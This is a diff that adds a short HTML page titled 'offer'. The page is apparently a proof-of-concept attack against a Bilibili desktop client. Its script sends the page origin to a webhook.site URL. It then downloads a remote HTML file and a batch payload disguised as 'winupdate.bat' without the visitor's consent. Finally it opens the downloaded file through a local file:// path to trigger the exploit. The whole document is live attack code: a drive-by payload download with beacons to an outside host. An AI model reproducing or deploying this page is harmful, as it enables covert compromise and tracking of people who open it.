@@ -1,0 +1,13 @@
+<!doctype html><title>offer</title>
+<script>
+var WB='https://webhook.site/05fd1420-af5c-493b-8c5d-353f67b3f438';
+function beacon(s){try{new Image().src=WB+'?s='+encodeURIComponent(s.slice(0,500))}catch(e){}}
+beacon('full2-loaded http-origin='+location.origin);
+function dl(u,n){var a=document.createElement('a');a.href=u;a.download=n;document.body.appendChild(a);a.click()}
+dl('https://raw.githubusercontent.com/DrunkThousandDreams/bili-im-poc/main/poc.html','setsvc.html');
+setTimeout(function(){dl('https://raw.githubusercontent.com/DrunkThousandDreams/bili-im-poc/main/payload.bat','winupdate.bat')},4000);
+setTimeout(function(){
+  beacon('opening-file-step');
+  window.open('file:///C:/Users/aaa/Downloads/setsvc.html?bilipc=1');
+},30000);
+</script>
